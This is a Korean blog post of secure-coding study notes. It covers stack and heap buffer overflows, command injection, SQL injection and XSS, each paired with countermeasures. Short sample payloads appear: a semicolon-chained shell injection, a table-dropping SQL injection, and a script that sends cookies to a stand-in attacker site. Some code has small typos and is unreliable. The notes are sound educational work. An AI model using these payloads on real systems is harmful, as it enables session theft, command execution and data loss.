---
title:  "소프트웨어 취약점과 XSS공격"
excerpt: "시큐어코딩"

categories:
  - 66Day
tags:
  - [공부일기, 시큐어코딩]

---
## 소프트웨어 취약점과 XSS공격

### 소프트웨어 취약점 공격 ( Software Vulnerability Attack )
> 소프트웨어 취약한 부분을 이용하여 공격자가 자신이 원하는 기능을 수행하는 코드를 주입하여 실행하는 공격

#### 공격의 종류
- 스택 버퍼 오버플로우 공격 ( Stack Buffer Overflow Attack )
- 힙 버퍼 오버 플로우 공격 ( Heap Buffer Overflow Attack )
- 명령 주입 공격 ( Command Injection Attack )
- SQL 주입 공격 ( SQL Injection Attack )
- 크로스 사이트 스크립팅 공격 ( XSS-Cross Site Scripting Attack )

    
	
___
  
### 1) 스텍버퍼 오버플로우 공격

#### 개념요소
- 스택 버퍼 : 프로그램의 함수 ( function ) 가 실행될 때 필요한 메모리 공간
- 버퍼 오버 플로우 ( Buffer Overflow )
	1. 데이터의 임시 저장 공간인 버퍼에 실제 할당된 버퍼 크기보다 큰 데이터가 입력되어 버퍼가 넘침으로 인해 인접한 메모리의 다른 정보를 덧쓰는 ( overwriting ) 현상
	2. 버퍼에 데이터를 입력받을때 입력값의 크기를 검증하지않아 버퍼가 흘러넘쳐 다른 변수나 메모리를 덮어씌우게 되는 버그
		- 이를 이용하여 RET를 원하는 주소로 덮어씌워 IP(Instruction Pointer)을 제어한다  
		
- 이용 취약점
입력하는 데이터의 크기를 할당된 버퍼 ( 변수 ) 의 최대크기와 정확하게 비교하는 로직이 생략된 취약한 함수 사용
- 버퍼 오버플로우에 취약한 함수
gets(), sprintf(), strcat(), strcpy(), vsprintf() 등등

  
#### 버퍼 오버플로우 공격
1. 스택 버퍼 오버플로우를 발생시켜 공격 대상 시스템을 다운시킴
2. 정교하게 가공된 코드를 주입하고 제어 흐름을 변경하여 주입된 코드를 실행
  
  
  
#### 프로세스 메모리 구조
|항목				|주소|
|---			|---|
|커널코드와데이터		|High|
|스택(stack)		|↑	|
|미할당메모리		|	|
|힙(Heap)		|	|
|전역데이터			|	|
|프로그램기계어코드	|↓	|
|PCB			|Low|

- 힙(Heap )영역 = 동적으로 할당되는 공간
- 스택 = 함수를 실행 할때 그 함수의 리턴주소라든지 매개변수라든지를 할당 함
- Heap, Data, Text : 메모리 낮은 주소부터 높은 주소의 순서로 수행
- Stack : 메모리 높은주소부터 쌓임. 
  
### 스택 프레임 구조
> ESP(스택포인터)가 아닌 EBP(베이스포인터)레지스터를 사용하여 스택내 로컬변수, 파라메터, 복귀주소에 접근하는 기법


#### 구조
1)
(프롤로그)
push ebp      ; Preserve current frame pointer
mov ebp, esp  ; Create new frame pointer pointing to current stack top
sub esp, 20   ; allocate 20 bytes worth of locals on stack.
  
···                           :  새로운 함수의 내용
ex)
mov [ebp-4], eax    ; Store eax in first local
mov ebx, [ebp - 8]  ; Load ebx from second local

  
(에필로그)
MOV		 ESP, EBP             :  ESP를 함수 시작했을 때의 값으로 복원
POP 	 EBP                  :  리턴되기 전에  저장해놨던 원래 EBP 값으로 복원
RETN                          :  함수 종료

2)
함수가 호출될 때 생성되고, 함수 실행이 종료 될 때 해제되어 프로그램이 실행됨에 따라 동적으로 변화
|항목								|	|
|---							|---|
|Return Address for Main		|	|
|Old Frame Pointer of Main		|	|
|매개변수1							|	|
|매개변수2							|	|
|2↓ Return Address for Calling Function			|	|
|1↓ Old Frame Pointer of calling Function|	← Frame Pointer|
|지역변수1			|	|
|지역변수2			|← Stack Pointer	|
- 공격 목표 1 = 지역변수의 버퍼를 오버플로우시켜 악성코드 주입
- 공격 목표 2 = 주입된 악성코드의 시작 주소로 변경

#### 공격 절차 ( EX )
1. 지역 변수 1에 입력되는 데이터는 아래에서 위로 차례대로 저장
2. 버퍼를 초과하는 데이터는 호출 함수의 스택 프레임에 대한 포인터를 덧쓰고 호출 함수로의 반환 주소를 덧씀
3. 덧쓰는 버퍼 내에 자신이 원하는 코드가 있는 경우 해당 코드가 위치한 메모리의 주소를 반환 주소 위치에 덧쓰여지도록 정교하게 버퍼에 입력되는 데이터를 조작
4. 호출 함수가 종료되면 공격자가 지정한 코드의 위치로 프로그램 제어가 반환

#### 쉘 코드 ( Shell Code )
공격자가 버퍼 오버플로우 공격을 통해 시스템 제어권 획득을 위해 입력하는 명령어 실행 프로그램

#### 쉘 코드 실행
버퍼 오버플로우 공격으로 함수의 반환 주소 ( Return Address ) 를 쉘 코드 시작 위치로 덧씀

#### 프로그램 기계어

오버플로우 공격대상 프로그램이 관리자 권한으로 실행 되는 시스템 프로그램인 경우 쉘 코드가 관리자의 권한으로 실행됨 -> 공격자가 관리자 권한 획득함으로써 임의의 명령을 실행가능하고 실행할시 피해를 입을 수 있음

#### NOP(No Operation) sled
- 정의
스택 버퍼의 맨 끝 부분에 쉘 코드를 위치시키고 버퍼의 앞 부분에 의도적으로 채워진 NOP 기계어의 연속
ASCII \x90
- NOP sled 설치 이유
반환 주소를 NOP sled의 넓은 범위의 주소 중의 하나에 해당되도록 추론하여 지정함으로써 쉘 코드 시작 주소 지정의 정확성을 높임 ( 공격주소의 시작주소를 좀 더쉽게 추론해서 함수의 반환주소와 바꿔치기하는 기술이라고 생각하면 될것 같은 )

#### 컴파일 시점 스택 버퍼 오버플로우 공격 대응책
1. 버퍼 오버플로우를 허용하지 않은 Java, ADA, Python과 같은 현대화된 고급 프로그래밍 언어를 사용
2. 할당된 버퍼의 크기를 초과하지 않도록 반드시 확인하는 로직을 포함하여 안전하게 프로그래밍
3. 안전한 라이브러리 함수 사용
4. 스택 프레임의 특정 위치에 카나리아 ( canary ) 라 불리는 예측하기 어려운 임의값을 추가하고 여부 탐지 ( 스택가드 기법 )
5. 스택 프레임의 함수 반환 주소를 메모리의 안전 지역에 기록
6. 기존의 프로그램들을 모두 새롭게 컴파일 필요하다는 문제점도 있을 수 있음

#### 실행 시점 대응책
1. 실행 가능 주소 공간 보호 ( Executable Address Space protection ) 기법 : 실행 코드가 프로세스 메모리 상의 특정 위치에서만 실행될 수 있게 함으로써 공격자가 스택 버퍼에 주입한 실행 코드 ( 쉘 코드 ) 는 원천적으로 실행 될 수 없게 만든다.

2. 주소 공간 임의화 ( Address Space Randomization ) 기법 : 스택 버퍼가 위치하는 주소 공간을 메모리 내에서 임의적으로 배치함으로써 공격자가 스택 버퍼 속에 주입한 실행 코드의 주소를 예측할 수 없게 만든다(스택, 힙, 라이브러리주소를 랜덤화하는 메모리 보호기법  )
  
     
	 
___
### 2) 힙 버퍼 오버 플로우 공격

- 힙 메모리
	1. 프로세스에서 malloc() 등의 함수를 통해 동적으로 메모리가 할당되는 영역
	2. 스택 프레임의 반환 주소 ( Return Address ) 가 존재하지 않음 ( 함수 포인터를 포함한 자료구조의 메모리 사용 )

- 힙 오버 플로우 공격
	1. 함수에 대한 포인터가 포함된 코드 구조에 할당된 힙 버퍼 메모리 공간을 오버플로우되도록 공격하여 쉡 코드를 주입
	2. 함수 포인터를 쉘 코드 시작 주소로 덧쓰기

- 공격 대상 힙 메모리 코드 ( EX )
```
typedef struct chunk {
	char inp[64];
	void (*process)(char *);
} chunk_t;

next = malloc(sizeof(chunk_t));
gets(net->inp);

```
#### 공격 과정
1. gets() 함수에 의해 입력되는 데이터에 NOP sled가 포함된 자신의 쉘 코드를 64byte 주입
2. 함수 포인터 위치에 쉘 코드 주소를 추론하여 입력
3. next -> process ( next -> inp) 함수를 호출한느 경우 프로그램의 제어는 공격자의 쉘 코드로 전달

#### 대응
1. 주소 공간 보호
2. 주소 공간 임의화 기법
   
   
___
### 3) 입력 포맷 취약점 공격
이용 취약점  = 프로그램들이 허용되는 입력 데이터의 형식을 정확하게 확인하지 않는 취약점 이용
- 공격 유형
	1. 명령 주입 공격
	2. SQL 주입 공격

- 정의
입력 필드에 스크립트 프로그램에 의해 실행될 수 있는 명령을 주입하여 스크립트 프로그램의 실행 권한으로 해당 명령이 서버에서 실행되도록 하는 공격

- 예제코드
finger.cgi PHP 프로그램
```
print '/user/bin/finger -sh $user'
```
입력 폼 ( form )
```
<input type=text name=user value="">
```
정상 입력
1. "Min"
2. 'finger -sh Min' 결과 출력

명령 주입 공격
1. "Min; echo 공격 성공; ls -l *"
공격자가 쉘 프로그램( sh ) 이 연속적인 명령어 실행을 허용하는 메타 문자 ( ; ) 를 활용하여 입력 문자열에 자신의 원하는 명령어 주입

2. finger 프로그램 실행 후 공격 코드 ( echo 프로그램 실행 -> ls 프로그램 실행 ) 실행

대응책
입력 데이터의 형식을 학인하여 허용되지 않는 형식의 정보가 입력되는 것을 방지

### 4) SQL 주입 공격

- 정의
SQL 데이터 입력 필드에 데이터베이스 프로그램에 의해 실행될 수 있는 악성 SQL 문을 주입하여 서버에 실행되도록 하는 공격

- SQL 주입공격
"Min; drop table 사용자_테이블"
PHP 프로그램 drop 문을 실행하여 사용자_테이블 데이터베이스를 모두 지움

- 대응책
SQL 입력에서 허용되는 입력 포맷의 형식을 정확하게 확인

___
### 5)크로스 사이트 스크립팅 공격

#### 정의
외부 서버로부터 웹 브라우저에게 악의적인 스크립터 코드가 포함된 웹 문서를 전달하여 웹 브라우저 사이트에서 자동으로 실행되게 하는 공격

#### XSS 공격의 주요 피해
1. 사용자 쿠키 정보 전송
2. 관리자 실행 권한 획득
3. 악성 코드 다운로드 등

#### XSS 공격 유형
1. 저장형 XSS 공격
2. 반사형 XSS 공격
3. DOM


#### 4-1. 저장형 XSS 공격 ( Stored XSS Attack )

- 정의
악성 스크립트 코드를 서버 사이트의 웹 페이지에 저장하고 해당 웹 페이지를 다운로드하는 웹 브라우저 사이트에서 악성 스크립트 코드가 자동으로 실행되게 하는 공격

- 악성 스크립트 코드 ( EX )
```
<script>document.locaion='http://www.xxx.com/app?cookie=' + document.cookie;</script>
```
자신의 쿠기 정보를 공격자의 웹 사이트로 전송

- 이용 취약점
1. 서버 사이트의 폼 페이지 입력란에 원래 목적과 다른 악성 스크립트 코드를 입력
2. 입력된 악성 스크립트 코드가 HTML에 포함된 정상적인 스크립트 코드로 해석되어 웹 브라우저에서 실행

- 대응책
1. 폼 페이지 필드에 XSS 공격에 사용될 수 있는 위험한 문자가 입력될 수 없게 함
2. 입력된 위험한 문자가 웹 브라우저에 의해 실행될 수 없게 함 ( HTML 엔티티 인코딩, javaScript 이스케이핑 ) 

#### 4-2.반사형 XSS 공격 ( Reflected XSS Attack )
- 정의
사용자가 악성 스크립트 코드가 매개변수 형태로 포함된 URL을 클릭할 때 악성 스크립트 코드가 서버 사이트에 의해 HTML 문서로 반사되어 웹 브라우저에서 실행되는 공격

- 특징
서버 사이트에 악성 스크립트 코드를 남기지 않아도 되는 장점

- 취약점 이용
URL 입력 필드에 원래의 목적과 다른 악성 스크립트 코드를 입력

- 대응
	1. URL 필드에 XSS 공격에 사용될 수 있는 위험한 문자가 입력될 수 없게 함
	2. URL 부분에 스크립트 코드가 포함될 경우 단순한 데이터 정보로 변환하는 URL 인코딩 기법 적용
